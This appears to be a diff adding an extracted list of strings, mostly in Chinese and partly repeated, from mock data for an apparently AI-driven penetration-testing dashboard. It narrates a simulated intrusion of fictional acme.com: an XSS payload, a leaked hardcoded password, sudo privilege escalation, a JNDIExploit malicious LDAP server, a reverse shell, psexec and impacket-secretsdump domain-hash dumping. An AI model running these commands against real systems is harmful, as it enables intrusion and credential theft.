@@ -1,0 +1,65 @@
+components/scope-text-editor.tsx :: example.com
+203.0.113.10
+198.51.100.0/24
+京ICP备12345678号-1
+Company name keyword
+lib/mock/data.ts :: q=<script>alert(document.domain)</script> 原样回显于结果标题。
+lib/mock/data.ts :: svc_deploy 属于 Domain Admins，psexec.py 以其登录 DC01 得 SYSTEM，secretsdump 导出全域 NTLM 哈希（含 krbtgt），完成靶标控制。
+lib/mock/data.ts :: www.acme.com .git 源码泄露与硬编码凭据提取
+lib/mock/data.ts :: 以立足点为 pivot 做内网主机发现
+lib/mock/data.ts :: sudo -l：(ALL) NOPASSWD: /usr/bin/python3 → 可提权 root
+lib/mock/data.ts :: graph_overview：goals 已由目标层拆好——g1「获取 acme.com 后台管理权限」、g2「读取用户敏感数据」，均 open；facts=0、recent_facts 为空（图基本空白，还没有任何 worker 产出）。范围内资产只有根域 acme.com + 一个 C 段。攻击面初判：www / admin / api / shop /
+lib/mock/data.ts :: reason：i7 RCE 拿到 DMZ 立足点(fa4)、fa5 提权 root、fa6 证明第二网卡直连内网并 ping 通 DC01——『突破 DMZ 建立内网立足点』验收达成。
+lib/mock/data.ts :: reason：Jenkins 泄露 svc_deploy(Domain Admin) → psexec 控制 DC01 → secretsdump 全域哈希，F-09 已确认，『拿下内部靶标域控 DC01』达成。
+lib/mock/data.ts :: reason：i2 用外网泄露的硬编码口令 Acme@2021 成功登入 admin 后台（Element-UI），获取后台管理权限，g1 达成。
+lib/mock/data.ts :: 先被动侦察子域，再对存活主机做端口/服务识别。
+lib/mock/data.ts :: search?q= 结果页把 q 拼进标题，先手工加单引号看报错。
+lib/mock/data.ts :: robots.txt 提到 /.git，先探测目录是否可下载，能拿源码就能白盒找注入点与硬编码密钥。
+lib/mock/data.ts :: shop.acme.com 是自研电商，先指纹识别框架/组件版本，再对存在已知反序列化的组件下手。
+lib/mock/data.ts :: java -jar JNDIExploit.jar -i <vps> -l 1389 &  # 起 LDAP/HTTP 恶意服务
+lib/mock/data.ts :: id; hostname -I  # 反弹 shell 内确认身份与网段
+lib/mock/data.ts :: www-data 权限有限，先做本地信息收集找提权点：sudo 配置、SUID、内核版本。
+lib/mock/data.ts :: sudo 白名单里 python3 且免密 —— 直接可提权。
+lib/mock/data.ts :: 两个域服务账号明文口令导出。
+lib/mock/data.ts :: svc_deploy 来自 Jenkins 凭据库，先查组成员资格——若属于 Domain Admins 就可直接 psexec DC01。
+lib/mock/data.ts :: 以 SYSTEM 身份登录域控 DC01。
+lib/mock/data.ts :: 全域 NTLM 哈希导出（含 krbtgt），可制作黄金票据持久控制。
+lib/mock/data.ts :: www-data 权限不够，先提权（sudo -l 看起来有戏）。拿到 root 后以 DMZ 为跳板做内网发现，优先域控和 Jenkins。
+lib/mock/data.ts :: impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc  # 已审批放行
+lib/mock/data.ts :: 优先后台与 API 越权面
+lib/mock/data.ts :: 先确认 admin.acme.com 的登录页技术栈和防护（验证码/速率限制），再决定用默认口令还是字典。
+lib/mock/data.ts :: 先摸 API 的鉴权方式和几个关键端点的行为，再判断 IDOR / JWT 风险。
+lib/mock/data.ts :: www-data 权限不够做内网横向，先看本地提权；拿 root 后以 DMZ 为 pivot 做存活发现。
+lib/mock/data.ts :: q=<script>alert(document.domain)</script> 原样回显于结果标题。
+lib/mock/data.ts :: svc_deploy 属于 Domain Admins，psexec.py 以其登录 DC01 得 SYSTEM，secretsdump 导出全域 NTLM 哈希（含 krbtgt），完成靶标控制。
+lib/mock/data.ts :: www.acme.com .git 源码泄露与硬编码凭据提取
+lib/mock/data.ts :: 以立足点为 pivot 做内网主机发现
+lib/mock/data.ts :: sudo -l：(ALL) NOPASSWD: /usr/bin/python3 → 可提权 root
+lib/mock/data.ts :: graph_overview：goals 已由目标层拆好——g1「获取 acme.com 后台管理权限」、g2「读取用户敏感数据」，均 open；facts=0、recent_facts 为空（图基本空白，还没有任何 worker 产出）。范围内资产只有根域 acme.com + 一个 C 段。攻击面初判：www / admin / api / shop /
+lib/mock/data.ts :: reason：i7 RCE 拿到 DMZ 立足点(fa4)、fa5 提权 root、fa6 证明第二网卡直连内网并 ping 通 DC01——『突破 DMZ 建立内网立足点』验收达成。
+lib/mock/data.ts :: reason：Jenkins 泄露 svc_deploy(Domain Admin) → psexec 控制 DC01 → secretsdump 全域哈希，F-09 已确认，『拿下内部靶标域控 DC01』达成。
+lib/mock/data.ts :: reason：i2 用外网泄露的硬编码口令 Acme@2021 成功登入 admin 后台（Element-UI），获取后台管理权限，g1 达成。
+lib/mock/data.ts :: 先被动侦察子域，再对存活主机做端口/服务识别。
+lib/mock/data.ts :: search?q= 结果页把 q 拼进标题，先手工加单引号看报错。
+lib/mock/data.ts :: robots.txt 提到 /.git，先探测目录是否可下载，能拿源码就能白盒找注入点与硬编码密钥。
+lib/mock/data.ts :: shop.acme.com 是自研电商，先指纹识别框架/组件版本，再对存在已知反序列化的组件下手。
+lib/mock/data.ts :: java -jar JNDIExploit.jar -i <vps> -l 1389 &  # 起 LDAP/HTTP 恶意服务
+lib/mock/data.ts :: id; hostname -I  # 反弹 shell 内确认身份与网段
+lib/mock/data.ts :: www-data 权限有限，先做本地信息收集找提权点：sudo 配置、SUID、内核版本。
+lib/mock/data.ts :: sudo 白名单里 python3 且免密 —— 直接可提权。
+lib/mock/data.ts :: 两个域服务账号明文口令导出。
+lib/mock/data.ts :: svc_deploy 来自 Jenkins 凭据库，先查组成员资格——若属于 Domain Admins 就可直接 psexec DC01。
+lib/mock/data.ts :: 以 SYSTEM 身份登录域控 DC01。
+lib/mock/data.ts :: 全域 NTLM 哈希导出（含 krbtgt），可制作黄金票据持久控制。
+lib/mock/data.ts :: www-data 权限不够，先提权（sudo -l 看起来有戏）。拿到 root 后以 DMZ 为跳板做内网发现，优先域控和 Jenkins。
+lib/mock/data.ts :: impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc  # 已审批放行
+lib/mock/data.ts :: 优先后台与 API 越权面
+lib/mock/data.ts :: 先确认 admin.acme.com 的登录页技术栈和防护（验证码/速率限制），再决定用默认口令还是字典。
+lib/mock/data.ts :: 先摸 API 的鉴权方式和几个关键端点的行为，再判断 IDOR / JWT 风险。
+lib/mock/data.ts :: www-data 权限不够做内网横向，先看本地提权；拿 root 后以 DMZ 为 pivot 做存活发现。
+lib/mock/handler.ts :: scriptText 执行 Groovy 命令返回 SYSTEM。
+lib/mock/handler.ts :: psexec 以 svc_deploy 登录域控 DC01。
+lib/mock/handler.ts :: scriptText 执行 Groovy 命令返回 SYSTEM。
+lib/mock/handler.ts :: psexec 以 svc_deploy 登录域控 DC01。
+lib/mock/handler.ts :: scriptText 执行 Groovy 命令返回 SYSTEM。
+lib/mock/handler.ts :: psexec 以 svc_deploy 登录域控 DC01。
